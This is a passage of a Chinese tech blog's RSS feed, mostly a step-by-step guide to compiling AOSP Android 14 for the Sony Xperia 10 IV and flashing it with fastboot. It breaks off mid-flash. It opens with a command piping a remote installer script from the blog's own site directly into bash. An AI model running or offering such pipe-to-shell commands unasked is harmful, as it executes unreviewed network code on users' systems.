<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://www.geekery.cn/sh/LinuxCTS/os/all/miniconda.sh</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Sony Xperia 10 IV(pdx225)AOSP14编译和刷机方法</title>
      <link>https://www.geekery.cn/note-book/Android/Sony%20Xperia%2010%20IV(pdx225)AOSP14%E7%BC%96%E8%AF%91%E5%92%8C%E5%88%B7%E6%9C%BA%E6%96%B9%E6%B3%95.html</link>
      <guid>https://www.geekery.cn/note-book/Android/Sony%20Xperia%2010%20IV(pdx225)AOSP14%E7%BC%96%E8%AF%91%E5%92%8C%E5%88%B7%E6%9C%BA%E6%96%B9%E6%B3%95.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Sony Xperia 10 IV(pdx225)AOSP14编译和刷机方法</source>
      <description>Sony Xperia 10 IV(pdx225)AOSP14编译和刷机方法 编译机环境准备 清理环境 安装jdk 经过测试，大版本一致即可 安装依赖 下载源码 官方参考链接： https://developer.sony.com/open-source/aosp-on-xperia-open-devices/guides/aosp-build-ins...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>编译机环境准备</h2>
<h3>清理环境</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> purge</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openjdk-</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icedtea-</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> icedtea6-</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">*</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>安装jdk</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> update</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> openjdk-11-jdk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">java</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -version</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">openjdk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> version</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> "11.0.20.1"</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 2023-08-24</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">OpenJDK</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Runtime</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Environment</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (build </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">11.0.20.1+1-post-Ubuntu-0ubuntu120.04</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">) </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">OpenJDK</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 64-Bit</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Server</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> VM</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> (build </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">11.0.20.1+1-post-Ubuntu-0ubuntu120.04,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mixed</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mode,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sharing</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>经过测试，大版本一致即可</p>
<h3>安装依赖</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bison</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> g++-multilib</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> gperf</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libxml2-utils</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> make</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> zlib1g-dev:i386</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> zip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> liblz4-tool</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libncurses5</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libssl-dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> bc</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flex</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> curl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> python-is-python3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> zlib1g-dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> libelf-dev</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dwarves</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>下载源码</h2>
<blockquote>
<p>官方参考链接： https://developer.sony.com/open-source/aosp-on-xperia-open-devices/guides/aosp-build-instructions/build-aosp-android-14/</p>
<p>经过测试官方最新源码无效，代码没有完全更新</p>
<p>这里需要选择 android-14.0.0_r34 版本进行编译</p>
</blockquote>
<h3>下载repo工具</h3>
<p>下载工具并且添加进当前用户环境变量里</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mkdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/bin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> http://commondatastorage.googleapis.com/git-repo-downloads/repo</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">~/bin/repo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">chmod</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> a+x</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/bin/repo</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/.bashrc</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> PATH</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">~/</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">bin</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">$PATH</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/.bashrc</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>初始化AOSP官方源码树</h3>
<blockquote>
<p>使用 清华源更快</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">mkdir</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/android</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ~/android</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># repo init -u https://android.googlesource.com/platform/manifest -b &lt;branch&gt;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">repo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> init</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://mirrors.tuna.tsinghua.edu.cn/git/AOSP/platform/manifest</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> android-14.0.0_r34</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>克隆sony官方源码库</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .repo</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> clone</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://github.com/sonyxperiadev/local_manifests</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> local_manifests</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> checkout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> android-14.0.0_r34</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">cd</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ../..</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>同步源码</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">repo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> sync</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -c</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j8</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>合并源码</h2>
<blockquote>
<p>这一步必须执行，不单单是更新aosp源码，sony源码会合并到aosp里</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">./repo_update.sh</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>编译</h2>
<blockquote>
<p>编译机用了 38G 内存， 32G不够用</p>
<p>lunch 必须是 aosp_xqcc54-ap1a-userdebug</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">source</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> build/envsetup.sh</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lunch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> lunch</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> aosp_xqcc54-ap1a-userdebug</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">make</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -j$(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nproc</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>电脑端驱动安装</h2>
<blockquote>
<p>插上手机用驱动精灵更方便，没有找到别的驱动，Android Studio会自带？</p>
</blockquote>
<h2>刷入</h2>
<blockquote>
<p>从官方下载OEM分区 并解压</p>
</blockquote>
<blockquote>
<p>https://developer.sony.com/file/download/software-binaries-for-aosp-android-14-0-kernel-5-4-murray-v3a</p>
</blockquote>
<p>总共需要如下镜像</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">$</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -l</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100663296</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:29</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> boot.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  25165824</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:31</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dtbo.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 287400120</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:40</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> product.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 446763712</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  6月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">  4</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 16:26</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> SW_binaries_for_Xperia_Android_14_5.4_v3a_murray.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 897827108</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:39</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 200142984</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:40</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system_ext.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">   6226268</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:39</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> userdata.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      8192</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:31</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vbmeta.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">      4096</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:40</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vbmeta_system.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 157900960</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:39</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vendor.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">-rw-r--r--</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> IT-Desktop</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 197121</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100663296</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  8月</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 19</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 17:40</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vendor_boot.img</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>进入fastbootd模式</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">adb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> reboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> fastboot</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h3>按分区刷入</h3>
<blockquote>
<p>有些分区编译出来没有，不刷也能正常运行</p>
</blockquote>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> boot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/boot.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> vbmeta</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/vbmeta.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> dtbo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/dtbo.img</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># fastboot flash recovery out/target/product/&lt;device&gt;/recovery.img</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fastboot</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> flash</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> system</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> out/target/product/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">devic</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">e&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/system.img</span></span>
